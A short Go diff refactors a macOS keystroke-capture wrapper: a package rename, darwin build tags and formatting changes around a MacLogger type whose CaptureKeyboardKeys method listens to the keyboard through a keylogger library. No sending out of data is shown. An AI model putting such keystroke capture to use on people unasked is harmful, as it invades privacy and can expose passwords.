@@ -1,4 +1,7 @@
-package mac
+//go:build darwin
+// +build darwin
+
+package keys
 
 import (
 	"bytes"
@@ -7,8 +10,7 @@ import (
 	"github.com/KeisukeYamashita/go-macos-keylogger/pkg/keylogger"
 )
 
-type MacLogger struct {
-}
+type MacLogger struct{}
 
 func NewMacLogger() *MacLogger {
 	return &MacLogger{}
@@ -27,7 +29,6 @@ func (l *MacLogger) CaptureKeyboardKeys(logBuffer *bytes.Buffer) {
 	}
 
 	kl.Listen(f)
-
 }
 
 func convertKey(key keyboard.Key) string {
